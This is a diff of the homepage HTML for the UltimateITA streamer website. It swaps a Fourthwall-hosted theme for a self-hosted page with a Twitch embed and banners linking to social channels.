@@ -1,382 +1,487 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
-    <meta content="width=device-width,initial-scale=1" name="viewport" />
-    <meta content="0.1.31" name="version" />
-    <link rel="canonical" href="https://ultimateita.it" />
+<html lang="en" class="wf-roboto-n4-active wf-nunito-n2-active wf-nunito-n6-active wf-muli-n9-active wf-active wf-barlow-n8-active wf-barlow-i8-active wf-orbitron-n4-active wf-montserratalternates-n4-active"><head>
+<style class="vjs-styles-defaults">
+      .video-js {
+        width: 300px;
+        height: 150px;
+      }
 
+      .vjs-fluid {
+        padding-top: 56.25%
+      }
+    </style>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+            <link rel="icon" type="image/png" href="images/papera.png">
+        <meta property="og:image" content="images/papera.png">
+          <meta property="og:description" content="Sito di UltimateITA">
+      <meta property="og:title" content="UltimateITA">
+              <meta property="og:url" content="https://ultimateita.it">
+          <meta name="theme-color" content="#17151A">
+    
     <title>UltimateITA</title>
 
-    
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="stylesheet" href="css/all.css" type="text/css">
 
 
+<style type="text/css">#main-app .crate-prompt[data-v-9f54902a] {
+  padding: 5rem;
+}
+@media (max-width: 500px) {
+#main-app .button[data-v-9f54902a] {
+    width: 100%;
+}
+}
+</style>
+<style type="text/css">.night .main-app[data-v-7590abdc] {
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  overflow: hidden;
+  background-color: #17242D;
+}
+.main-route-container[data-v-7590abdc] {
+  flex: 1;
+  max-width: 100%;
+}
+</style>
 
-<meta name="description" content="Sito web per UltimateITA" />
-<meta property="og:site_name" content="UltimateITA">
-<meta property="og:url" content="https://ultimateita.it">
-<meta property="og:title" content="UltimateITA">
-<meta property="og:type" content="website">
-<meta property="og:description" content="Sito web per UltimateITA">
-<meta name="twitter:site" content="@">
-<meta name="twitter:creator" content="@">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="UltimateITA">
-<meta name="twitter:description" content="Sito web per UltimateITA">
-<link rel="shortcut icon" href="https://imgproxy.fourthwall.com/QFjJ4p-MEgHySTfiP3F6p51gRidvPPDcJzf7xK1Tuwc/s:96:96/sm:1/aHR0cHM6Ly9zdG9y/YWdlLmdvb2dsZWFw/aXMuY29tL2Nkbi5m/b3VydGh3YWxsLmNv/bS9zaG9wcy9zaF80/MDdhOTM4MS1iOGVm/LTRkZTMtYjQ0ZC1i/NWZiYTU4YmEwM2Mv/dGhlbWVzL2I0MzIz/NzE1LTY3OTEtNDc2/Yi1iMGFmLTIwZWNk/ZmNhZGM4Yi5qcGc.webp" sizes="96x96" type="image/png" />
-<link rel="shortcut icon" href="https://imgproxy.fourthwall.com/-4MnvkcfV3nh1H3Ti59JZxtNQ1kRDpvcBk_Fl2RjAkM/s:48:48/sm:1/aHR0cHM6Ly9zdG9y/YWdlLmdvb2dsZWFw/aXMuY29tL2Nkbi5m/b3VydGh3YWxsLmNv/bS9zaG9wcy9zaF80/MDdhOTM4MS1iOGVm/LTRkZTMtYjQ0ZC1i/NWZiYTU4YmEwM2Mv/dGhlbWVzL2I0MzIz/NzE1LTY3OTEtNDc2/Yi1iMGFmLTIwZWNk/ZmNhZGM4Yi5qcGc.webp" sizes="48x48" type="image/png" />
-<link rel="apple-touch-icon" href="https://imgproxy.fourthwall.com/dshJiLxpwQJJIT0uYK6STXM-hfvpknuFUVp0LT6Vqkw/s:180:180/sm:1/aHR0cHM6Ly9zdG9y/YWdlLmdvb2dsZWFw/aXMuY29tL2Nkbi5m/b3VydGh3YWxsLmNv/bS9zaG9wcy9zaF80/MDdhOTM4MS1iOGVm/LTRkZTMtYjQ0ZC1i/NWZiYTU4YmEwM2Mv/dGhlbWVzL2I0MzIz/NzE1LTY3OTEtNDc2/Yi1iMGFmLTIwZWNk/ZmNhZGM4Yi5qcGc.webp" sizes="180x180" type="image/png" />
-<meta content="#ffffff" name="msapplication-TileColor" />
-<link rel="stylesheet" type="text/css" href="https://themes.fourthwall.com/themes/assets/0e3f5cff-c3c8-4429-b5aa-ced3f25e3e2f/assets/vendor.css?v=b7fdac61a90ad1e625b76fc6f1342182af70842cac88754be5a33627c4de548e" media="all" />
-<link rel="stylesheet" type="text/css" href="https://themes.fourthwall.com/themes/assets/0e3f5cff-c3c8-4429-b5aa-ced3f25e3e2f/assets/styles/css-variables.scss.css?v=b9c8ad6d581a3404cd5c1cd9874fab47ca0df1f9b07910cc67f1c69290f5f1e3" media="all" />
-<link rel="stylesheet" type="text/css" href="https://themes.fourthwall.com/themes/assets/0e3f5cff-c3c8-4429-b5aa-ced3f25e3e2f/assets/styles/theme.scss.css?v=594cdb816a4f4ec725585fd2ffb85dc3412d06928856d3b556622424c7fd5970" media="all" />
-<link rel="preconnect" href="https://imgproxy.fourthwall.com" crossorigin>
-<link rel="preconnect" href="https://storage.googleapis.com" crossorigin>
-<script src="/en-eur/platform/geo/redirect.js"></script>
-<script src="https://js.stripe.com/v3/" defer></script>
-<link rel="alternate" href="https://ultimateita.it/" hreflang="x-default" />
-<script src="https://cdn.fourthwall.com/web-perf/instant.js" defer></script>
-<meta name='theme-color' content='#000000' />
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"UltimateITA","description":"Sito web per UltimateITA","url":"https://ultimateita.it","sameAs":["https://twitch.tv/ultimateita","https://youtube.com/channel/UCalupUa9UYb5JEk3pP29E0A","https://tiktok.com/@ultytok","https://discordapp.com/invite/ultimateita","https://instagram.com/ig.ultimateita"]}</script>
-  </head>
-  <body class="body">
-    <div class="page">
-      <header class="page__header">
-        <div id="fw-section-header" class="fw-section">
-<div data-testid="main.single.section" class="header">
-  <div class=" wrapper">
-    <div class="header__sections">
-      <div class="header__section header__section--left">
-        <div class="header__logo visible@sm">
-            <h1 class="header__logo visible@sm">
-            <a href="#" class="header__logo-link">
-  <span class="text-logo">
+<style type="text/css">.live-stream-twitch {
+  height: 100%;
+}
+</style>
+<style type="text/css">.live-stream__root[data-v-fb7c3f86] {
+  padding: 0 !important;
+  background-color: transparent !important;
+  border-radius: inherit;
+}
+.live-stream__video[data-v-fb7c3f86] {
+  padding: 0;
+  height: 100%;
+  width: 100%;
+}
+.live-stream__float[data-v-fb7c3f86] {
+  position: fixed;
+  z-index: 101;
+  right: 16px;
+  bottom: 8px;
+  height: 170px;
+  width: 300px;
+  opacity: 1;
+}
+.site-canvas--mobile .live-stream__float[data-v-fb7c3f86] {
+  position: unset !important;
+  height: 100% !important;
+  width: 100% !important;
+}
+.main-app--with-chat-sidebar .live-stream__video.live-stream__float[data-v-fb7c3f86] {
+  right: 316px;
+}
+.live-stream__video-container[data-v-fb7c3f86] {
+  height: 90%;
+  overflow: hidden;
+}
+.live-stream__video-container--full[data-v-fb7c3f86] {
+  height: 100% !important;
+}
+</style>
+<style type="text/css">.t-panel {
+  position: absolute;
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+}
+.t-panel .t-panel__image {
+  width: 100%;
+  max-height: 115px;
+  margin: 0 auto;
+  -o-object-fit: contain;
+     object-fit: contain;
+}
+.t-panel h1,
+.t-panel h2,
+.t-panel h3,
+.t-panel h4,
+.t-panel h5 {
+  margin-bottom: 8px !important;
+}
+
+.t-panel .t-panel__title {
+  font-weight: 900;
+  margin-bottom: 8px;
+}
+</style>
+<style type="text/css">.site-control-element[data-v-635cf3b7] {
+  position: absolute;
+  top: 0;
+  bottom: 0;
+  right: 0;
+  margin: auto 8px;
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  transition: all 275ms;
+  opacity: 0;
+  z-index: 5;
+}
+</style>
+<style type="text/css">.site-component[data-v-0cca636e] {
+  position: relative;
+  flex: 1;
+  width: 100%;
+  height: 100%;
+}
+.site-component--editing:hover .site-component-controls[data-v-0cca636e] {
+  opacity: 1;
+}
+.site-component-controls[data-v-0cca636e] {
+  position: absolute;
+  top: 0;
+  right: 0;
+  margin: 8px;
+  transition: all 275ms;
+  z-index: 6;
+  opacity: 0;
+}
+.component-container[data-v-0cca636e] {
+  transition: all 1s ease-in-out;
+}
+.component-container.highlight[data-v-0cca636e] {
+  box-shadow: 0 0 5px #80F5D2;
+  transform: scale(1.05);
+}
+</style>
+
+<style type="text/css">.navbar-site-logo[data-v-0c5c97a3] {
+  position: relative;
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  align-items: center;
+}
+.navbar-site-logo--editing:hover .logo-edit-icon[data-v-0c5c97a3] {
+  z-index: 1;
+  opacity: 1;
+}
+.navbar__user-letter-logo[data-v-0c5c97a3] {
+  text-align: center;
+  font-size: 30px;
+  background: var(--button-color);
+  color: var(--button-text-color);
+  padding-top: 6px;
+}
+.navbar__logo[data-v-0c5c97a3],
+.navbar__user-letter-logo[data-v-0c5c97a3] {
+  width: 35px;
+  height: 35px;
+  border-radius: 50%;
+  cursor: pointer;
+  transition: all 275ms;
+  border: 3px solid transparent;
+}
+.navbar__logo[data-v-0c5c97a3]:hover,
+.navbar__user-letter-logo[data-v-0c5c97a3]:hover {
+  border-color: var(--button-color);
+}
+.navbar__logo--large[data-v-0c5c97a3],
+.navbar__user-letter-logo--large[data-v-0c5c97a3] {
+  width: 75px;
+  height: 75px;
+}
+.navbar__logo--x-large[data-v-0c5c97a3],
+.navbar__user-letter-logo--x-large[data-v-0c5c97a3] {
+  width: 100px;
+  height: 100px;
+}
+.logo-edit-icon[data-v-0c5c97a3] {
+  position: absolute;
+  left: 30px;
+  top: 0px;
+  z-index: -1;
+  min-width: 87px;
+  margin-right: 8px;
+  margin-left: 8px;
+}
+</style>
+<style type="text/css">.twitch-partnered-icon[data-v-14a3aa3e] {
+  font-size: 18px;
+  margin-left: 8px;
+}
+</style>
+<style type="text/css">.navbar__title[data-v-ba730246] {
+  font-size: 25px;
+  line-height: 18px;
+  cursor: pointer;
+  font-weight: 700;
+  transition: all 275ms;
+}
+.navbar-site-title[data-v-ba730246] {
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  align-items: center;
+  position: relative;
+}
+.navbar-site-title--can-edit:hover .site-control-element__site-title[data-v-ba730246] {
+  z-index: 1;
+  opacity: 1;
+}
+.custom-title-input[data-v-ba730246] {
+  margin-right: 8px;
+}
+.site-control-element__site-title[data-v-ba730246] {
+  position: absolute;
+  left: 88%;
+  top: 0;
+  z-index: -1;
+  min-width: 112px;
+  margin-right: 8px;
+  margin-left: 8px;
+}
+</style>
+
+<style type="text/css">.navbar-socials--margin-left[data-v-2839db71] {
+  margin-left: 16px;
+}
+.navbar-socials__icon[data-v-2839db71] {
+  font-size: 18px;
+  text-decoration: none;
+  cursor: pointer;
+  vertical-align: middle;
+  color: var(--header-color) !important;
+  margin-right: 16px;
+}
+.navbar-socials__with-partner[data-v-2839db71] {
+  padding-left: 8px;
+}
+</style>
+<style type="text/css">.powered-by[data-v-76dc89ea] {
+  font-size: 12px;
+  margin-bottom: -8px;
+}
+.footer-container[data-v-76dc89ea] {
+  width: 100%;
+  position: relative;
+  margin-top: 32px;
+  text-decoration: none !important;
+}
+.footer-wrapper[data-v-76dc89ea] {
+  padding-top: 64px;
+  padding-bottom: 64px;
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  max-width: 1060px !important;
+  margin: auto;
+}
+.footer-text[data-v-76dc89ea] {
+  font-size: 12px;
+  padding: 8px;
+  border-radius: 4px;
+  text-align: center;
+}
+.footer-batch[data-v-76dc89ea] {
+  text-decoration: none;
+  background: var(--section-bg-color);
+  color: var(--body-color);
+  margin-bottom: 16px;
+  font-size: 16px;
+  padding-top: 8px;
+  padding-bottom: 8px;
+  padding-right: 16px;
+  padding-left: 16px;
+  border-radius: 8px;
+}
+.site-canvas--live .footer-wrapper[data-v-76dc89ea] {
+  max-width: 1290px !important;
+  width: 98%;
+}
+</style>
+
+<style type="text/css">.site-canvas-wrapper[data-v-75ee8f9a] {
+  position: relative;
+  z-index: 2;
+  overflow: auto;
+  max-height: 100vh;
+  height: 100%;
+}
+.site-canvas-body-wrapper[data-v-75ee8f9a] {
+  transition: all 275ms;
+}
+.site-canvas-body[data-v-75ee8f9a] {
+  transition: all 275ms;
+  position: relative;
+  width: 100%;
+}
+.site-canvas-sections-container[data-v-75ee8f9a] {
+  width: 100%;
+}
+.site-canvas__domain-picker-banner-wrapper[data-v-75ee8f9a] {
+  background-color: #17242D;
+  position: relative;
+  padding-right: 16px;
+  padding-bottom: 16px;
+  z-index: 2;
+}
+.site-canvas--editing[data-v-75ee8f9a] {
+  max-height: calc(100vh - 104px) !important;
+}
+.site-canvas--editing .site-canvas-body[data-v-75ee8f9a] {
+  z-index: 3;
+}
+.site-canvas-controls[data-v-75ee8f9a] {
+  position: absolute;
+  top: 0;
+  right: 0;
+  margin: 8px;
+  transition: all 275ms;
+  z-index: 2;
+}
+
+</style>
+</head>
+  <body class="night">
+    <input type="hidden" id="username" value="ultimateita">
+    <div data-v-7590abdc id="main-app" class="main-app root-element-for-custom-colors" style="--header-color:#FF0303; --body-color:#6AB7E2; --button-color:#FFFFFF; --button-text-color:#09161D; --button-hover-bg-color:undefined; --button-hover-border-color:undefined; --bg-color:#17151A; --section-bg-color:; --input-border-color:rgba(255,255,255,0.24); --scrollbar-track-bg:rgba(56, 63, 91, 0.7); --scrollbar-thumb-bg:rgba(255, 255, 255, 0.4); --modal-bg-color:#2e344bff; --section-border-color:#000000; --section-border-radius:5px; --popup-bg-color:#ffffff; --section-max-width:1300px; --section-border-width:0px; --section-vertical-padding:0px;"><!----> <!----> 
+	<div data-v-7590abdc class="main-route-container">
+	<div data-v-75426160 data-v-7590abdc class="live-container router-view custom-font--e-sports"><!----> <!----> <!----> 
+	<div data-v-75ee8f9a data-v-75426160 id="root-component" class="site-canvas-in-live site-canvas--tablet">
+	<div data-v-75ee8f9a class="site-canvas-wrapper site-canvas--live" data-cy-theme-label="undefined" data-cy-theme-id="1" style="background-image: url(https://ultimateita.it/images/sfondo.png); background-size: cover; background-position: center top;">
+	<div data-v-75ee8f9a class="flex site-canvas-body-wrapper custom-font--e-sports">
+	<div data-v-75ee8f9a id="b9f764ab-d633-4930-ac88-e009b9ec9c7d" class="site-canvas-body">
+	<div data-v-75ee8f9a class="site-canvas-background"></div>
+	<div data-v-75ee8f9a class="site-canvas-background-overlay"></div>
+	<div data-v-75ee8f9a class="flex">
+	<div data-v-75ee8f9a class="site-canvas-sections-container">
+	<div data-v-9d2f42ac data-v-75ee8f9a id="navbar" class="navbar navbar-container navbar--live navbar--tablet" style="border-bottom: none;"><!----> 
+	<div data-v-cf4d3e96 data-v-8fea1ab4 data-v-9d2f42ac class="navbar__wrap">
+	<div data-v-cf4d3e96 class="navbar__left">
+	<div data-v-cf4d3e96>
+	<div data-v-0c5c97a3 data-v-cf4d3e96 class="navbar-site-logo">
+	<img data-v-0c5c97a3 src="images/ultilogo.jpg" class="navbar__logo navbar__logo--small navbar__logo--circle"> <!----> <!---->
+	</div></div> 
+	<div data-v-ba730246 data-v-cf4d3e96 class="navbar-site-title"><span data-v-ba730246 class="navbar__title custom-font-style--header">
     UltimateITA
-  </span>
-            </a>
-            </h1>
-        </div>
-        <div class="hidden@sm">
-          <button
-            data-drawer-trigger-primary="mobile-menu"
-            class="header__icon header__icon--hamburger"
-          >
-            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M0 3.75H20M0 10H20M0 16.25H20" vector-effect="non-scaling-stroke" stroke="currentColor" stroke-width="1.5"/>
-</svg>
-          </button>
-        </div>
-      </div>
-      <div class="header__section header__section--middle">
-        <div class="header__logo hidden@sm">
-          <a href="/en-eur/" class="header__logo-link">
-  <span class="text-logo">
-    UltimateITA
-  </span>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
+  </span> <!----> <i data-v-14a3aa3e data-v-ba730246 class="icon-check twitch-partnered-icon has-tooltip"></i></div> 
+  <div data-v-2839db71 data-v-cf4d3e96 class="navbar-socials navbar-socials__with-partner navbar-socials--margin-left">
+  <a data-v-2839db71 href="https://YouTube.com/c/ultimateita?sub_confirmation=1" target="_blank" rel="noreferrer noopener" class="navbar-socials__icon fab fa-youtube has-tooltip" aria-hidden="true"></a>
+  <a data-v-2839db71 href="https://www.twitch.tv/ultimateita" target="_blank" rel="noreferrer noopener" class="navbar-socials__icon fab fa-twitch has-tooltip" aria-hidden="true"></a>
+  <a data-v-2839db71 href="https://www.instagram.com/ig.ultimateita" target="_blank" rel="noreferrer noopener" class="navbar-socials__icon fab fa-instagram has-tooltip" aria-hidden="true"></a>
+  <a data-v-2839db71 href="https://www.discord.gg/ultimateita" target="_blank" rel="noreferrer noopener" class="navbar-socials__icon fab fa-discord has-tooltip" aria-hidden="true"></a></div></div></div>
+<div data-v-75ee8f9a>
+<div data-v-75ee8f9a>
+<div data-v-4fdf0cba data-v-75ee8f9a id="3e81e9b4-970a-49dd-a0b7-5628017dc477" class="site-section site-section--live site-section--first"><!----> 
+<div data-v-4fdf0cba class="site-section-content flex">
+<div data-v-2d8063f8 data-v-4fdf0cba class="site-section-child-container" style="flex: 100 1 0%; height: 820px;">
+<div data-v-79b6fa0e data-v-2d8063f8 id="bbb491a4-4bc1-40b8-8318-82079d600673" class="site-section-dropzone-wrapper">
+<div data-v-0cca636e data-v-79b6fa0e id="live-stream" class="site-component"><!----> 
+<div data-v-fb7c3f86 data-v-0cca636e class="live-stream__root component-container component-live-stream" settings-prop="[object Object]" id="e107e9ee-10e6-4616-84d0-3fb6a2caad3d" style="background-size: cover; background-position: center center; background-color: rgb(46, 52, 75);">
+<div data-v-fb7c3f86 class="live-stream__video-container live-stream__video-container--full" style="border-radius: 5px; background-color: rgba(0, 0, 0, 0.3);"><!----> 
+<div data-v-fb7c3f86 id="live-stream__video" class="live-stream__video"><!----> 
+<div data-v-fb7c3f86 id="live-stream-twitch" class="live-stream-twitch">
+<iframe src="https://player.twitch.tv/?channel=UltimateITA&parent=ultimateita.it" allowfullscreen scrolling="no" frameborder="0" allow="autoplay; fullscreen" title="Twitch" sandbox="allow-modals allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox" width="100%" height="100%"></iframe></div></div></div> <!----> 
+<div data-v-fb7c3f86></div></div></div></div></div></div></div> <!----></div>
+ <!----></div>
+<div data-v-75ee8f9a>
+<div data-v-4fdf0cba data-v-75ee8f9a id="70b4ac8b-c986-4133-8aff-4741ab7b564b" class="site-section site-section--live" style="background-image: url(&quot;&quot;); background-size: cover; background-position: center center;"><!----> 
+<div data-v-4fdf0cba class="site-section-content flex">
+<div data-v-2d8063f8 data-v-4fdf0cba class="site-section-child-container" style="flex: 25 1 0%; height: 110px;">
+<div data-v-79b6fa0e data-v-2d8063f8 id="5016f37b-a8e7-4922-b100-790b72b561ac" class="site-section-dropzone-wrapper">
+<div data-v-0cca636e data-v-79b6fa0e id="twitch-panel" class="site-component"><!----> 
+<div data-v-0cca636e class="t-panel component-container component-t-panel" settings-prop="[object Object]" id="df32a161-8ecd-4abe-bd4e-c0a2d2ee968d"><!----> <a href="https://youtube.com/c/ultimateita?sub_confirmation=1" target="_blank" rel="noreferrer noopener"><img src="images/UltyYTbanner.png" alt class="t-panel__image"></a> 
+</div></div></div></div>
+<div data-v-2d8063f8 data-v-4fdf0cba class="site-section-child-container" style="flex: 25 1 0%; height: 110px;">
+<div data-v-79b6fa0e data-v-2d8063f8 id="00c69cbb-67ed-4df7-885f-ab9c141a33c6" class="site-section-dropzone-wrapper">
+<div data-v-0cca636e data-v-79b6fa0e id="twitch-panel" class="site-component"><!---->
+<div data-v-0cca636e class="t-panel component-container component-t-panel" settings-prop="[object Object]" id="df32a161-8ecd-4abe-bd4e-c0a2d2ee968d"><!----> <a href="https://discord.gg/ultimateita" target="_blank" rel="noreferrer noopener"><img src="images/UltyDCbanner.png" alt class="t-panel__image"></a> 
+</div></div></div></div>
+<div data-v-2d8063f8 data-v-4fdf0cba class="site-section-child-container" style="flex: 25 1 0%; height: 110px;">
+<div data-v-79b6fa0e data-v-2d8063f8 id="fd5130cb-2a40-47d9-9cfc-fa77d02ec57d" class="site-section-dropzone-wrapper">
+<div data-v-0cca636e data-v-79b6fa0e id="twitch-panel" class="site-component"><!----> 
+<div data-v-0cca636e class="t-panel component-container component-t-panel" settings-prop="[object Object]" id="df32a161-8ecd-4abe-bd4e-c0a2d2ee968d"><!----> <a href="https://instagram.com/ig.ultimateita" target="_blank" rel="noreferrer noopener"><img src="images/UltyIGbanner.png" alt class="t-panel__image"></a> 
+</div></div></div></div>
+<div data-v-2d8063f8 data-v-4fdf0cba class="site-section-child-container" style="flex: 25 1 0%; height: 110px;">
+<div data-v-79b6fa0e data-v-2d8063f8 id="25be637c-65c4-407d-8842-10e9ceb9d3e6" class="site-section-dropzone-wrapper">
+<div data-v-0cca636e data-v-79b6fa0e id="twitch-panel" class="site-component"><!----> 
+<div data-v-0cca636e class="t-panel component-container component-t-panel" settings-prop="[object Object]" id="df32a161-8ecd-4abe-bd4e-c0a2d2ee968d"><!----> <a href="https://tiktok.com/@ultytok" target="_blank" rel="noreferrer noopener"><img src="images/UltyTTbanner.png" alt class="t-panel__image"></a> 
+</div></div></div></div>
+<div data-v-2d8063f8 data-v-4fdf0cba class="site-section-child-container" style="flex: 25 1 0%; height: 110px;">
+<div data-v-79b6fa0e data-v-2d8063f8 id="25be637c-65c4-407d-8842-10e9ceb9d3e6" class="site-section-dropzone-wrapper">
+<div data-v-0cca636e data-v-79b6fa0e id="twitch-panel" class="site-component"><!----> 
+<div data-v-0cca636e class="t-panel component-container component-t-panel" settings-prop="[object Object]" id="df32a161-8ecd-4abe-bd4e-c0a2d2ee968d"><!----> <a href="/resource.html" target="_blank" rel="noreferrer noopener"><img src="images/UltyRPbanner.png" alt class="t-panel__image"></a> 
+</div></div></div></div></div></div> <!----></div>
+<div data-v-75ee8f9a>
+ <!----></div></div></div></div> 
+<div data-v-76dc89ea data-v-75ee8f9a data-cy="footer" class="footer-container">
+<div data-v-76dc89ea class="footer-wrapper">
+<div data-v-76dc89ea class="flex flex-v-center">
+<div data-v-76dc89ea>
+<div data-v-76dc89ea class="footer-text">
+<img data-v-0c5c97a3 src="images/savage.gif" class="navbar__logo navbar__logo--large navbar__logo--circle">
+<!--<video src="images/audio.mp3" autoplay="true" controls="" style="height: 20px; width: 30%;"></video>--> <!----> <!---->
+    </div></div></div></div></div></div></div> <!----> <!----> <!----> <!----> <!----> <!----> <!----></div></div> <!----> <!----></div>
+    <script src="js/manifest.js"></script>
+    <script src="js/site.js"></script><style></style>
 
-<aside 
-  data-drawer="mobile-menu" 
-  class="drawer hidden@sm"
->
-  <div class="drawer__background" data-drawer-trigger-primary="mobile-menu"></div>
-  <div class="drawer__content drawer__content--small mobile-menu">
-    <div class="mobile-menu__section mobile-menu__section--header">
-      <a href="#" class="mobile-menu__close" data-drawer-trigger-primary="mobile-menu">
-        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M1.25 18.75L18.75 1.25M18.75 18.75L1.25 1.25" vector-effect="non-scaling-stroke" stroke="currentColor" stroke-width="1.5" stroke-linejoin="bevel"/>
-</svg>
-      </a>
-    </div>
-    <div class="mobile-menu__section mobile-menu__section--body">
-      <div class="mobile-menu__nav">
-        <ul class="mobile-menu__list">
-            <li class="mobile-menu__list-item">
-            </li>
-        </ul>
-      </div>
-    </div>
-    <div class="mobile-menu__section mobile-menu__section--socials">
-      <div class="mobile-menu__list-social">
-        <ul class="mobile-menu__socials">
-    <li class="mobile-menu__social">
-      <a
-          href="https://twitch.tv/ultimateita"
-        target="_blank"
-        class="mobile-menu__social-link"
-      >
-        <svg width="20" height="20" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.99993 0L2.28564 5.71429V26.2857H9.14279V32L14.8571 26.2857H19.4285L29.7142 16V0H7.99993ZM27.4285 14.8571L22.8571 19.4286H18.2856L14.2856 23.4286V19.4286H9.14279V2.28571H27.4285V14.8571ZM24.0001 6.28577H21.7144V13.1429H24.0001V6.28577ZM15.4285 6.28577H17.7142V13.1429H15.4285V6.28577Z" fill="currentColor"></path>
-</svg>
-          <div class="mobile-menu__social-badge">
-            Live
-          </div>
-      </a>
-    </li>
+<!-- fonts -->
+<link href="css/style.css" rel="stylesheet">
 
-    <li class="mobile-menu__social">
-      <a
-          href="https://youtube.com/channel/UCalupUa9UYb5JEk3pP29E0A"
-        target="_blank"
-        class="mobile-menu__social-link"
-      >
-        <svg width="24" height="17" viewBox="0 0 24 17" xmlns="http://www.w3.org/2000/svg">
-  <path d="M20.062 0H3.938A3.944 3.944 0 0 0 0 3.939v9.121A3.944 3.944 0 0 0 3.938 17h16.125A3.944 3.944 0 0 0 24 13.06V3.939A3.944 3.944 0 0 0 20.062 0zm-3.524 8.531l-6.769 4.331a.504.504 0 0 1-.509.017.5.5 0 0 1-.26-.438V3.779a.502.502 0 0 1 .77-.422l6.769 4.332a.499.499 0 0 1-.001.842z" fill-rule="nonzero"/>
-</svg>
+<script src="js/webfont.js"></script>
 
-      </a>
-    </li>
-    <li class="mobile-menu__social">
-      <a
-          href="https://tiktok.com/@ultytok"
-        target="_blank"
-        class="mobile-menu__social-link"
-      >
-        <svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 2859 3333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" clip-rule="evenodd">
-  <path d="M2081 0c55 473 319 755 778 785v532c-266 26-499-61-770-225v995c0 1264-1378 1659-1932 753-356-583-138-1606 1004-1647v561c-87 14-180 36-265 65-254 86-398 247-358 531 77 544 1075 705 992-358V1h551z"/>
-</svg>
-      </a>
-    </li>
-    <li class="mobile-menu__social">
-      <a
-          href="https://discordapp.com/invite/ultimateita"
-        target="_blank"
-        class="mobile-menu__social-link"
-      >
-        <svg width="24" height="24" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
-  <path d="M15 4.5C15 4.5 13.2802 3.15375 11.25 3L11.067 3.36638C12.9022 3.816 13.7445 4.45875 14.625 5.25C13.1074 4.47525 11.61 3.75 9 3.75C6.39 3.75 4.89262 4.47525 3.375 5.25C4.2555 4.45875 5.2575 3.744 6.933 3.36638L6.75 3C4.62 3.20063 3 4.5 3 4.5C3 4.5 1.07963 7.28475 0.75 12.75C2.685 14.9824 5.625 15 5.625 15L6.24 14.181C5.196 13.818 4.0185 13.1704 3 12C4.21425 12.9187 6.04688 13.875 9 13.875C11.9531 13.875 13.7858 12.9187 15 12C13.9819 13.1704 12.8044 13.818 11.76 14.181L12.375 15C12.375 15 15.315 14.9824 17.25 12.75C16.9204 7.28475 15 4.5 15 4.5ZM6.5625 11.25C5.83725 11.25 5.25 10.5788 5.25 9.75C5.25 8.92125 5.83725 8.25 6.5625 8.25C7.28775 8.25 7.875 8.92125 7.875 9.75C7.875 10.5788 7.28775 11.25 6.5625 11.25ZM11.4375 11.25C10.7122 11.25 10.125 10.5788 10.125 9.75C10.125 8.92125 10.7122 8.25 11.4375 8.25C12.1628 8.25 12.75 8.92125 12.75 9.75C12.75 10.5788 12.1628 11.25 11.4375 11.25Z">
-</svg>
-      </a>
-    </li>
-    <li class="mobile-menu__social">
-      <a
-          href="https://instagram.com/ig.ultimateita"
-        target="_blank"
-        class="mobile-menu__social-link"
-      >
-        <svg width="22" height="22" viewBox="0 0 22 22" xmlns="http://www.w3.org/2000/svg">
-  <path d="M5.495 0h11.01A5.494 5.494 0 0 1 22 5.495v11.01A5.494 5.494 0 0 1 16.505 22H5.495A5.494 5.494 0 0 1 0 16.505V5.495A5.494 5.494 0 0 1 5.495 0zM2.2 16.505A3.294 3.294 0 0 0 5.495 19.8h11.01a3.294 3.294 0 0 0 3.295-3.295V5.495A3.294 3.294 0 0 0 16.505 2.2H5.495A3.294 3.294 0 0 0 2.2 5.495v11.01zM5.5 11a5.5 5.5 0 1 1 11 0 5.5 5.5 0 0 1-11 0zm8.8 0a3.3 3.3 0 1 0-6.6 0 3.3 3.3 0 0 0 6.6 0zm2.2-4.4a1.1 1.1 0 1 0 0-2.2 1.1 1.1 0 0 0 0 2.2z" fill-rule="nonzero"/>
-</svg>
-      </a>
-    </li>
-        </ul>
-      </div>
-    </div>
-  </div>
-</aside>
-</div>
-      </header>
-      <div class="page__main">
-        <div class="main">
-  <div data-testid="main.sections" class="main__sections">
-    <div id="fw-section-hero-video-0" class="fw-section"><section data-section-id="" data-testid="main.single.section" class="hero hero-- hero--move-top">
-  <div class="section-background">
-      <video playsinline autoplay muted loop class="section-background__video">
-        <source src="https://storage.googleapis.com/popshopprod-shop-renderer-assets-q9gk7sc6/themes/assets/0e3f5cff-c3c8-4429-b5aa-ced3f25e3e2f/assets/hero-video-0-video-755c5e075f7e790f1ad665ef33546881ae6375cb0daca2d66c3da65935b5df5a.webm" type="video/mp4">
-        Your browser does not support HTML5 video.
-      </video>
-      <div
-        class="section-background__overlay"
-        style="background-color:#ffffff;opacity:0.2;"
-      ></div>
-  </div>
-  <div class="hero__inner">
-    <div class="container wrapper">
-      <div 
-        class="hero__content hero__content--center hero__content--large"
-        style="color:#F9F8FF;"
-      >
-        <h1
-          class="hero__heading hero__heading--large"
-          style="color:#F9F8FF;"
-        >
-        </h1>
-      </div>
-    </div>
-  </div>
-    <div class="hero__socials" style="color:#F9F8FF;">
